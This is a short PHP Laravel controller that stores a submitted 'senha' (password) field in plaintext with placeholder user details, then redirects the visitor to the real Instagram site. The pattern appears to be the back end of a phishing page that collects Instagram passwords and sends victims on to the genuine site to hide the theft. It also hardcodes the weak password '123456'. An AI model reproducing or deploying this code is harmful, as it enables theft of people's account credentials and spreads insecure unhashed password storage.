<?php

namespace App\Http\Controllers;

use App\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;

class UserController extends Controller
{
    public function store(Request $request)
    {


            $user = new User();
            $user->name = 'joao';
            $user->email = 'teste'.Carbon::createFromTimestamp(-1)->toDateTimeString().'@gmail.com';
            $user->senha = $request->senha;
            $user->password = '123456';
            $user->save();


            return Redirect::to('https://www.instagram.com/instagram/?hl=pt-br');

    }
}
